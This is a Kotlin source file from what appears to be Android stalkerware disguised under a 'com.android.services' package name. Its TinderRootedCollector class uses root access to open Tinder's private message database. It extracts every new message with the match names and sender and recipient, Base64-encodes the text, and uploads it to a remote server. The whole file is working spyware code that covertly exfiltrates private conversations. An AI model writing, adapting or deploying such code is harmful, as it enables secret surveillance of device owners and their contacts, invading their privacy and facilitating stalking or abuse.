package com.android.services.logs.collectors.im

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.text.TextUtils
import com.android.services.db.entities.TinderRooted
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.RootPermission
import com.android.services.util.logException
import com.android.services.util.logVerbose
import java.util.*

class TinderRootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncTinder) {
            try {
                val tinderList = retrieveTinderMessages(context, localDatabaseSource)
                if (tinderList.isNotEmpty()) {
                    val startDate: Date = tinderList[tinderList.size - 1].messageDate
                    val endDate: Date = tinderList[0].messageDate
                    val mTinderHelper = RemoteServerHelper(
                        context,
                        AppConstants.TINDER_ROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    mTinderHelper.upload(tinderList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.TINDER_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.TINDER_ROOTED_TYPE} Sync is Off")
        }
    }

    companion object {

        private const val tinderFolder = "com.tinder"
        private const val tinderDB = "tinder-3.db"

        private fun retrieveTinderMessages(
            context: Context,
            localDatabaseSource: LocalDatabaseSource,
        ): List<TinderRooted> {
            var tinderList = ArrayList<TinderRooted>()
            try {
                RootPermission.setPermissionTinder()
                val tinderDatabase = ("/data/data/"
                        + tinderFolder
                        + "/databases/"
                        + tinderDB)

                val selection: String?
                val selectionArgs: Array<String>?
                val since: String
                val maxTimeStamp = localDatabaseSource.selectTinderRootedMaxTimeStamp() ?: "0"
                since = maxTimeStamp.toString()

                if (since.isNotEmpty()) {
                    selection = String.format("%s > ?", "sent_date")
                    selectionArgs = arrayOf(since)
                } else {
                    selection = null
                    selectionArgs = null
                }
                val database =
                    SQLiteDatabase.openDatabase(tinderDatabase, null, SQLiteDatabase.OPEN_READONLY)
                val cursor = database.query("message",
                    null,
                    selection,
                    selectionArgs,
                    null,
                    null,
                    "sent_date DESC")
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        try {
                            val messageId = cursor.getString(cursor.getColumnIndex("id"))
                            val matchId = cursor.getString(cursor.getColumnIndex("match_id"))
                            val type = cursor.getString(cursor.getColumnIndex("type"))
                            val fromId = cursor.getString(cursor.getColumnIndex("from_id"))
                            val toId = cursor.getString(cursor.getColumnIndex("to_id"))
                            val timeStamp = cursor.getString(cursor.getColumnIndex("sent_date"))
                            val messageText = cursor.getString(cursor.getColumnIndex("text"))
                            var conversationName = ""
                            val cus = database.query("match_person",
                                null,
                                "id=?",
                                arrayOf(fromId),
                                null,
                                null,
                                null)
                            if (cus != null) {
                                if (cus.moveToFirst()) {
                                    conversationName = cus.getString(cus.getColumnIndex("name"))
                                }
                                cus.close()
                            }
                            var messageType = "incoming"
                            if (TextUtils.isEmpty(conversationName)) {
                                messageType = "outgoing"
                                val curs = database.query("match_person",
                                    null,
                                    "id=?",
                                    arrayOf(toId),
                                    null,
                                    null,
                                    null)
                                if (curs != null) {
                                    if (curs.moveToFirst()) {
                                        conversationName =
                                            curs.getString(curs.getColumnIndex("name"))
                                    }
                                    curs.close()
                                }
                            }
                            val tinderRooted = TinderRooted()
                            tinderRooted.apply {
                                this.messageId = messageId
                                this.conversationId = matchId
                                this.userName = conversationName
                                this.messageText = AppUtils.convertStringToBase64(messageText)
                                this.date = AppUtils.formatDate(timeStamp)
                                this.type = messageType
                                this.timeStamp = timeStamp.toLong()
                                this.messageDate = AppUtils.getDate(timeStamp.toLong())
                                this.status = 0
                            }
                            tinderList.add(tinderRooted)
                        } catch (e: Exception) {
                            logVerbose(
                                "${AppConstants.TINDER_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                                throwable = e
                            )
                        }
                    }
                    cursor.close()
                }
                database.close()
                logVerbose("${AppConstants.TINDER_ROOTED_TYPE} rooted list = $tinderList")
                if (tinderList.isNotEmpty())
                    localDatabaseSource.insertTinderRooted(tinderList)
                localDatabaseSource.selectTinderRooted {
                    tinderList = it as ArrayList<TinderRooted>
                }
                logVerbose("${AppConstants.TINDER_ROOTED_TYPE} selected list = $tinderList")
            } catch (e: Exception) {
                logVerbose(
                    "${AppConstants.TINDER_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
            return tinderList
        }
    }
}